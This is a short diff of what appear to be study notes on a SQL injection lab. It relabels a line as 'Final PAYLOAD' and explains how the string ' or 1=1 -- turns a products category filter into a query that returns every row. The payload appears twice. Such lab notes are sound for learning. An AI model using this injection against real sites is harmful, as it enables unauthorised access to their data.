@@ -10,7 +10,7 @@ doesn't break the app but return nothing
 
 => SELECT * FROM products WHERE category = '' or 1=1 --
 
-Final query = ' or 1=1 --
+Final PAYLOAD = ' or 1=1 --
 
 Here's the breakdown of what happens:
 
@@ -23,3 +23,5 @@ The SQL query SELECT * FROM products WHERE category = '' or 1=1 -- is effectivel
 
 
 BYPASS THE WHERE CONDITION
+
+Final PAYLOAD = ' or 1=1 --
